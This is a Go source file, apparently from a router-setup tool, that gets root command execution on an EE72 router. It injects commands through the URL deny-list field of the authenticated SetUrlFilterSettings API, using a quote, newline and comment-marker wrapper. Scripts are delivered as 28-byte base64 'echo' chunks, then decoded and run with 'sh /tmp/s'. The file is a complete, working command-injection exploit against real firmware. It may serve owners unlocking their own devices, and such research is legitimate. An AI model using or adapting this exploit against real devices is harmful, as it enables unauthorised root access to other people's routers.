// Package channel runs commands on an EE72 through the authenticated
// SetUrlFilterSettings parameter.
//
// The parameter is evaluated by core_app as root. Its value may contain
// newlines, quotes and redirections, but the whole command is limited to 28
// bytes, so a script is delivered in chunks and reassembled on the device.
package channel

import (
	"context"
	"encoding/base64"
	"errors"
	"fmt"
	"strings"
	"sync"

	"github.com/rctphone/ee-setup/internal/tclapi"
)

// MaxCommand is the longest command the firmware accepts in the parameter.
const MaxCommand = 28

// blocked characters are rejected by core_app's parser.
const blocked = ";|&`"

// Runner executes short commands on one EE72.
type Runner struct {
	Client  *tclapi.Client
	Verbose bool
	mu      sync.Mutex
}

// ParameterValue wraps a command in the inert filter entry core_app expects:
// a lone quote, a newline, the command, a newline and a comment marker.
func ParameterValue(cmd string) (string, error) {
	cmd = strings.TrimSpace(cmd)
	if cmd == "" {
		return "", errors.New("channel: empty command")
	}
	if len(cmd) > MaxCommand {
		return "", fmt.Errorf("channel: command is %d bytes, limit is %d: %q", len(cmd), MaxCommand, cmd)
	}
	if strings.ContainsAny(cmd, blocked) {
		return "", fmt.Errorf("channel: command contains a blocked character (%s): %q", blocked, cmd)
	}
	return "'\n" + cmd + "\n#", nil
}

// Run executes one command that fits in the parameter.
func (r *Runner) Run(ctx context.Context, cmd string) error {
	value, err := ParameterValue(cmd)
	if err != nil {
		return err
	}
	return r.call(ctx, value)
}

func (r *Runner) call(ctx context.Context, value string) error {
	r.mu.Lock()
	defer r.mu.Unlock()
	if r.Verbose {
		fmt.Printf("    > %s\n", strings.ReplaceAll(value, "\n", "\\n"))
	}
	_, err := r.Client.Call(ctx, "SetUrlFilterSettings", map[string]any{
		"filter_policy": 2,
		"UrlAllowList":  []string{},
		"UrlDenyList":   []string{value},
	})
	return err
}

// Reset clears the filter policy. Safe to call when nothing was set.
func (r *Runner) Reset(ctx context.Context) error {
	r.mu.Lock()
	defer r.mu.Unlock()
	_, err := r.Client.Call(ctx, "SetUrlFilterSettings", map[string]any{
		"filter_policy": 0,
		"UrlAllowList":  []string{},
		"UrlDenyList":   []string{},
	})
	return err
}

// ChunkCommands returns the 28-byte commands that rebuild script on the device
// as base64, decode it and run it. No listening socket is involved.
func ChunkCommands(script string) []string {
	b64 := base64.StdEncoding.EncodeToString([]byte(script))
	cmds := []string{"rm -f /tmp/e"}
	const chunk = 15 // "echo " + 15 + ">>/tmp/e" == 28
	for i := 0; i < len(b64); i += chunk {
		end := i + chunk
		if end > len(b64) {
			end = len(b64)
		}
		cmds = append(cmds, "echo "+b64[i:end]+">>/tmp/e")
	}
	return append(cmds, "base64 -d /tmp/e>/tmp/s", "sh /tmp/s")
}

// ChunkScan delivers script with short commands only. It is the no-privilege
// path: the device never fetches anything, so nothing listens on the host.
func (r *Runner) ChunkScan(ctx context.Context, script string) error {
	cmds := ChunkCommands(script)
	for i, cmd := range cmds {
		err := r.Run(ctx, cmd)
		if err != nil {
			if i == len(cmds)-1 {
				fmt.Printf("    note: the device did not acknowledge the script (%v); it may still be running\n", err)
				return nil
			}
			return err
		}
		if i > 0 && i%40 == 0 {
			fmt.Printf("    sent %d/%d commands\n", i, len(cmds))
		}
	}
	return nil
}
